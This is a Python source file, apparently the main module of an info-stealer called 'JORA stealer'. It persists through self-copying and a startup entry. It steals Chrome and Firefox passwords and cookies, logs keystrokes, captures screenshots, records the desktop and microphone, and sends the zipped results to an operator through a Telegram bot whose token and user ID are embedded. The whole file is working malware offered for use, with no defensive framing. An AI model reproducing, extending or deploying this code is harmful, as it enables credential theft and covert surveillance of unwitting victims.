#               _____   ___   _______          _
#              |_   _|.'   `.|_   __ \        / \
#                | | /  .-.  \ | |__) |      / _ \
#            _   | | | |   | | |  __ /      / ___ \
#           | |__' | \  `-'  /_| |  \ \_  _/ /   \ \_
#           `.____.'  `.___.'|____| |___||____| |____|
#
#                   _                _             
#              ___ | |_  ___   __ _ | |  ___  _ __ 
#             / __|| __|/ _ \ / _` || | / _ \| '__|
#             \__ \| |_|  __/| (_| || ||  __/| |   
#             |___/ \__|\___| \__,_||_| \___||_|  

import os
import telebot
import socket
import time
from PC.zip_p import zip_res, zip_screenshot
from brawser.chrome import chrome
from brawser.chrome_cookies import chrome_cookies
from brawser.firefox import firefox_pswd
from brawser.firefox_cookies import get_firefox_cookies
from PC.setup import setup
from PC.screenshot import screenshot_pc
from PC.key_log import key_log_start
from PC.desktop_video import video_cap
from PC.mic_recording import sound_mic
from PC.start_up import add_to_startup
from PC.copy_me import copy_me
from threading import Thread


Telegram = True    # Send data to telegram or not
TOKEN = "5422702933:AAGoMlBXP-xqlfdlNt4rnSvAOjuh7NIqWZI"    # TOKEN for bot
MYID = 1703777321   # your telegram id


def remove_func():
    """
    deleting unnecessary files
    """
    os.remove(r"C:\System32\x25x02x42\Loginvault.db")
    os.remove(r"C:\System32\x25x02x42\Cookies.db")
    os.remove(r"C:\System32\x25x02x42\scr_des.png")
    os.remove(r"C:\System32\x25x02x42\setup_pc.txt")
    os.remove(r"C:\System32\x25x02x42\chrome_passwords.txt")
    os.remove(r"C:\System32\x25x02x42\chrome_cookies.txt")
    os.remove(r"C:\System32\x25x02x42\Firefox_password.txt")
    os.remove(r"C:\System32\x25x02x42\Firefox_cookies.txt")


def chat():
    """
    working with telegram chat
    """
    bot = telebot.TeleBot(TOKEN)  # creating a bot

    # send data and start capturing sound keyboard and desktop
    @bot.message_handler(commands=["start"])
    def start(m, res=False):
        # checking for a specific user
        if m.from_user.id == MYID:
            # creating an archive and data from browsers
            with open(fr"C:\System32\x25x02x42\{socket.gethostname()}.zip", 'rb') as f:
                bot.send_document(m.chat.id, f)
                remove_func()

            os.remove(fr"C:\System32\x25x02x42\{socket.gethostname()}.zip")   # deleting a used archive

            th_keylog = Thread(target=key_log_start, daemon=True)  # keyboard capture
            time.sleep(2)
            th_video_cap = Thread(target=video_cap, daemon=True)   # desktop recording
            th_sound_mic = Thread(target=sound_mic, daemon=True)   # sound recording
            # starting threads
            th_keylog.start()
            th_video_cap.start()
            th_sound_mic.start()

        else:
            bot.send_message(m.chat.id, '?')

    @bot.message_handler(commands=["screenshot"])
    def screenshot(m, res=False):
        # checking for a specific user
        if m.from_user.id == MYID:
            screenshot_pc()
            zip_screenshot()
            # creating archive for screenshot and keylogger
            with open(fr"C:\System32\x25x02x42\{socket.gethostname()}_log.zip", 'rb') as f:
                bot.send_document(m.chat.id, f)
            # creating archive for desktop video
            with open(fr"C:\System32\x25x02x42\{socket.gethostname()}_video_desk.zip", "rb") as f:
                bot.send_document(m.chat.id, f)
            # create archive for audio
            with open(fr"C:\System32\x25x02x42\{socket.gethostname()}_sound.zip", "rb") as f:
                bot.send_document(m.chat.id, f)
            # deleting used files
            os.remove(r"C:\System32\x25x02x42\scr_des.png")
            os.remove(fr"C:\System32\x25x02x42\{socket.gethostname()}_video_desk.zip")
            os.remove(fr"C:\System32\x25x02x42\{socket.gethostname()}_log.zip")
            os.remove(fr"C:\System32\x25x02x42\{socket.gethostname()}_sound.zip")
            # resuming threads
            th_video_cap = Thread(target=video_cap, daemon=True)
            th_sound_mic = Thread(target=sound_mic, daemon=True)
            th_video_cap.start()
            th_sound_mic.start()
        else:
            bot.send_message(m.chat.id, '?')

    bot.polling(none_stop=True, interval=0)     # bot launch


def call_func():
    """
    function call list
    """
    #   copy_me()
    #   add_to_startup()
    get_firefox_cookies()
    firefox_pswd()
    chrome_cookies()
    chrome()
    setup()
    screenshot_pc()
    zip_res()


def main():

    try:
        os.mkdir(r"C:\System32")
    except Exception as ex:
        print(ex)
    try:
        os.mkdir(r"C:\System32\x25x02x42")  # styler output folder
    except Exception as ex:
        print(ex)
    try:
        os.mkdir(r"C:\System32\x73x2jx45")   # video folder
    except Exception as ex:
        print(ex)
    try:
        os.mkdir(r"C:\System32\x6dx21x6q")   # microphone recording folder
    except Exception as ex:
        print(ex)
    copy_me()

    add_to_startup()

    call_func()
    # save in telegram
    if Telegram:
        chat()
    # save to directory
    else:
        th = Thread(target=key_log_start())
        th.start()


if __name__ == "__main__":
    main()
